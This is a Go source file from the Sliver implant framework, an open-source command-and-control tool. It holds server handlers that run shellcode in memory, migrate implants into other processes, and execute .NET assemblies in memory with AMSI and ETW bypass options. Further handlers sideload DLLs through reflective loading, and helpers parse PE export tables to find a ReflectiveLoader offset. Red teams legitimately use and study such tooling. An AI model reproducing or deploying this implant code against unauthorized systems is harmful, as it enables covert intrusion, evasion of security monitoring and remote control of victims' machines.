package rpc

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"bytes"
	"context"
	"debug/pe"
	"encoding/binary"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"path"
	"strings"

	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/server/assets"
	"github.com/bishopfox/sliver/server/core"
	"github.com/bishopfox/sliver/server/generate"

	"github.com/golang/protobuf/proto"
)

// Task - Execute shellcode in-memory
func (rpc *Server) Task(ctx context.Context, req *sliverpb.TaskReq) (*sliverpb.Task, error) {
	resp := &sliverpb.Task{}
	err := rpc.GenericHandler(req, resp)
	if err != nil {
		return nil, err
	}
	return resp, nil
}

// Migrate - Migrate to a new process on the remote system (Windows only)
func (rpc *Server) Migrate(ctx context.Context, req *clientpb.MigrateReq) (*sliverpb.Migrate, error) {
	var shellcode []byte
	session := core.Sessions.Get(req.Request.SessionID)
	if session == nil {
		return nil, ErrInvalidSessionID
	}
	shellcode, err := getSliverShellcode(req.Config.GetName())
	if err != nil {
		config := generate.ImplantConfigFromProtobuf(req.Config)
		config.Name = ""
		config.Format = clientpb.ImplantConfig_SHELLCODE
		config.ObfuscateSymbols = false
		shellcodePath, err := generate.SliverShellcode(config)
		if err != nil {
			return nil, err
		}
		shellcode, err = ioutil.ReadFile(shellcodePath)
	}
	reqData, err := proto.Marshal(&sliverpb.InvokeMigrateReq{
		Request: req.Request,
		Data:    shellcode,
		Pid:     req.Pid,
	})
	if err != nil {
		return nil, err
	}
	timeout := rpc.getTimeout(req)
	respData, err := session.Request(sliverpb.MsgInvokeMigrateReq, timeout, reqData)
	if err != nil {
		return nil, err
	}
	resp := &sliverpb.Migrate{}
	err = proto.Unmarshal(respData, resp)
	if err != nil {
		return nil, err
	}
	return resp, nil
}

// ExecuteAssembly - Execute a .NET assembly on the remote system in-memory (Windows only)
func (rpc *Server) ExecuteAssembly(ctx context.Context, req *sliverpb.ExecuteAssemblyReq) (*sliverpb.ExecuteAssembly, error) {
	session := core.Sessions.Get(req.Request.SessionID)
	if session == nil {
		return nil, ErrInvalidSessionID
	}

	// We have to add the hosting DLL to the request before forwarding it to the implant
	hostingDllPath := path.Join(assets.GetDataDir(), "HostingCLRx64.dll")
	hostingDllBytes, err := ioutil.ReadFile(hostingDllPath)
	if err != nil {
		return nil, err
	}
	offset, err := getExportOffset(hostingDllPath, "ReflectiveLoader")
	if err != nil {
		return nil, err
	}
	reqData, err := proto.Marshal(&sliverpb.ExecuteAssemblyReq{
		Request:    req.Request,
		Assembly:   req.Assembly,
		HostingDll: hostingDllBytes,
		Arguments:  req.Arguments,
		Process:    req.Process,
		AmsiBypass: req.AmsiBypass,
		EtwBypass:  req.EtwBypass,
		Offset:     offset,
	})
	if err != nil {
		return nil, err
	}

	rpcLog.Infof("Sending execute assembly request to session %d\n", req.Request.SessionID)
	timeout := rpc.getTimeout(req)
	respData, err := session.Request(sliverpb.MsgExecuteAssemblyReq, timeout, reqData)
	if err != nil {
		return nil, err
	}
	resp := &sliverpb.ExecuteAssembly{}
	err = proto.Unmarshal(respData, resp)
	if err != nil {
		return nil, err
	}
	return resp, nil
}

// Sideload - Sideload a DLL on the remote system (Windows only)
func (rpc *Server) Sideload(ctx context.Context, req *sliverpb.SideloadReq) (*sliverpb.Sideload, error) {
	session := core.Sessions.Get(req.Request.SessionID)
	if session == nil {
		return nil, ErrInvalidSessionID
	}

	var err error
	var respData []byte
	timeout := rpc.getTimeout(req)
	switch session.ToProtobuf().GetOS() {
	case "windows":
		shellcode, err := generate.ShellcodeRDIFromBytes(req.Data, req.EntryPoint, req.Args)
		if err != nil {
			return nil, err
		}
		data, err := proto.Marshal(&sliverpb.SideloadReq{
			Request:     req.Request,
			Data:        shellcode,
			ProcessName: req.ProcessName,
		})
		if err != nil {
			return nil, err
		}
		respData, err = session.Request(sliverpb.MsgSideloadReq, timeout, data)
	case "darwin":
		fallthrough
	case "linux":
		reqData, err := proto.Marshal(req)
		if err != nil {
			return nil, err
		}
		respData, err = session.Request(sliverpb.MsgSideloadReq, timeout, reqData)
	default:
		err = fmt.Errorf("%s does not support sideloading", session.ToProtobuf().GetOS())
	}
	if err != nil {
		return nil, err
	}

	resp := &sliverpb.Sideload{}
	err = proto.Unmarshal(respData, resp)
	if err != nil {
		return nil, err
	}
	return resp, nil
}

// SpawnDll - Spawn a DLL on the remote system (Windows only)
func (rpc *Server) SpawnDll(ctx context.Context, req *sliverpb.SpawnDllReq) (*sliverpb.SpawnDll, error) {
	resp := &sliverpb.SpawnDll{}
	err := rpc.GenericHandler(req, resp)
	if err != nil {
		return nil, err
	}
	return resp, nil
}

// Utility functions
func getSliverShellcode(name string) ([]byte, error) {
	var data []byte
	// get implants builds
	configs, err := generate.ImplantConfigMap()
	if err != nil {
		return data, err
	}
	// get the implant with the same name
	if conf, ok := configs[name]; ok {
		if conf.Format == clientpb.ImplantConfig_SHELLCODE {
			fileData, err := generate.ImplantFileByName(name)
			if err != nil {
				return data, err
			}
			data = fileData
		} else {
			err = fmt.Errorf("no existing shellcode found")
		}
	} else {
		err = fmt.Errorf("no sliver found with this name")
	}
	return data, err
}

// ExportDirectory - stores the Export data
type ExportDirectory struct {
	Characteristics       uint32
	TimeDateStamp         uint32
	MajorVersion          uint16
	MinorVersion          uint16
	Name                  uint32
	Base                  uint32
	NumberOfFunctions     uint32
	NumberOfNames         uint32
	AddressOfFunctions    uint32 // RVA from base of image
	AddressOfNames        uint32 // RVA from base of image
	AddressOfNameOrdinals uint32 // RVA from base of image
}

func rvaToFoa(rva uint32, pefile *pe.File) uint32 {
	var offset uint32
	for _, section := range pefile.Sections {
		if rva >= section.SectionHeader.VirtualAddress && rva <= section.SectionHeader.VirtualAddress+section.SectionHeader.Size {
			offset = section.SectionHeader.Offset + (rva - section.SectionHeader.VirtualAddress)
		}
	}
	return offset
}

func getFuncName(index uint32, rawData []byte, fpe *pe.File) string {
	nameRva := binary.LittleEndian.Uint32(rawData[index:])
	nameFOA := rvaToFoa(nameRva, fpe)
	funcNameBytes, err := bytes.NewBuffer(rawData[nameFOA:]).ReadBytes(0)
	if err != nil {
		log.Fatal(err)
		return ""
	}
	funcName := string(funcNameBytes[:len(funcNameBytes)-1])
	return funcName
}

func getOrdinal(index uint32, rawData []byte, fpe *pe.File, funcArrayFoa uint32) uint32 {
	ordRva := binary.LittleEndian.Uint16(rawData[index:])
	funcArrayIndex := funcArrayFoa + uint32(ordRva)*8
	funcRVA := binary.LittleEndian.Uint32(rawData[funcArrayIndex:])
	funcOffset := rvaToFoa(funcRVA, fpe)
	return funcOffset
}

func getExportOffset(filepath string, exportName string) (funcOffset uint32, err error) {
	rawData, err := ioutil.ReadFile(filepath)
	if err != nil {
		return 0, err
	}
	handle, err := os.Open(filepath)
	if err != nil {
		return 0, err
	}
	defer handle.Close()
	fpe, _ := pe.NewFile(handle)
	exportDirectoryRVA := fpe.OptionalHeader.(*pe.OptionalHeader64).DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
	var offset = rvaToFoa(exportDirectoryRVA, fpe)
	exportDir := ExportDirectory{}
	buff := &bytes.Buffer{}
	buff.Write(rawData[offset:])
	err = binary.Read(buff, binary.LittleEndian, &exportDir)
	if err != nil {
		return 0, err
	}
	current := exportDir.AddressOfNames
	nameArrayFOA := rvaToFoa(exportDir.AddressOfNames, fpe)
	ordinalArrayFOA := rvaToFoa(exportDir.AddressOfNameOrdinals, fpe)
	funcArrayFoa := rvaToFoa(exportDir.AddressOfFunctions, fpe)

	for i := uint32(0); i < exportDir.NumberOfNames; i++ {
		index := nameArrayFOA + i*8
		name := getFuncName(index, rawData, fpe)
		if strings.Contains(name, exportName) {
			ordIndex := ordinalArrayFOA + i*2
			funcOffset = getOrdinal(ordIndex, rawData, fpe, funcArrayFoa)
		}
		current += uint32(binary.Size(i))
	}

	return
}
